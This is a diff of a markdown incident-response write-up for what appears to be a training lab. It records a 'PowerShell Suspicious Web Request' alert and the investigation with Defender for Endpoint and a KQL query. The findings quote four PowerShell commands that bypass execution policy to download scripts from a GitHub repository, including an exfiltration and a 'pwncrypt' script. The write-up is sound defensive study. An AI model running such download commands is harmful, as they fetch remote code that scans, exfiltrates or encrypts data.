@@ -54,7 +54,7 @@ powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
 
 ---
 
-## Part 3: Work Incident
+## Work Incident
 Following the **NIST 800-161: Incident Response Lifecycle**, I worked through the incident to completion.
 
 ### **Preparation**
@@ -62,17 +62,42 @@ Following the **NIST 800-161: Incident Response Lifecycle**, I worked through th
 - Verified that necessary tools, systems, and training were in place.
 
 ### **Detection and Analysis**
-- Identified and validated the incident.
-- Assigned the incident to myself and set the status to Active.
-- Investigated the Incident via **Actions → Investigate**.
-- Gathered relevant evidence, such as logs and PowerShell script downloads.
-- Simulated contacting the user, who claimed they installed free software at the time of the suspicious activity (for lab purposes).
+
+Upon investigating the triggered incident “Jayda - PwerShell Suspicious Web Request” it was discovered that the following PowerShell were run on machine: windows-target-1
+
+| Target System      | Command Executed |
+|--------------------|----------------------------------------------------------------------------------------------------------------------------------|
+| windows-target-1  | `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1` |
+| windows-target-1  | `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1` |
+| windows-target-1  | `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1` |
+| windows-target-1  | `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1` |
+
 
 #### **Findings:**
-- The **PowerShell Suspicious Web Request** incident was triggered on _X_ devices by _Y_ users.
-- PowerShell downloaded _Z_ different scripts from the internet:
-  - URL to Script 1
-  - URL to Script 2
+- The suspicious web request incident was triggered on 1 device by 1 user, but downloaded 4 different scripts with 4 different commands
+
+| Script Name         | Description |
+|---------------------|-------------|
+| **Portscan.ps1**   | Scans a specified range of IP addresses and common ports to identify open and closed ports. Logs the results to a file. |
+| **Exfiltratedata.ps1** | Generates fake employee data, compresses it using 7-Zip, and attempts to upload it to Azure Blob Storage. Also maintains a backup of the generated files. |
+| **Eicar.ps1**      | Creates an EICAR test file to simulate a potential malware detection scenario for testing antivirus responses. |
+
+
+# Investigation Summary
+
+After investigating with Defender for Endpoint, it was determined that the downloaded scripts actually did run. See the following query:
+
+```kusto
+let TargetHostname = "windows-target-1"; // Replace with the name of your VM as it shows up in the logs
+let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); // Add the name of the scripts that were downloaded
+DeviceProcessEvents
+| where DeviceName == TargetHostname // Comment this line out for MORE results
+| where FileName == "powershell.exe"
+| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
+| order by TimeGenerated
+| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
+```
+
 
 To verify whether the scripts were executed, I ran:
 
@@ -92,9 +117,7 @@ DeviceProcessEvents
 ### **Containment, Eradication, and Recovery**
 - Isolated the affected system using Microsoft Defender for Endpoint.
 - Performed an antimalware scan in MDE.
-- If any scripts were executed, I analyzed their content using ChatGPT and recorded my findings:
-  - Script **X.ps1** was observed to **[describe action]**.
-  - Script **Y.ps1** was observed to **[describe action]**.
+- If any scripts were executed, I analyzed their content.
 - Removed the threat and restored the system to normal.
 
 ---
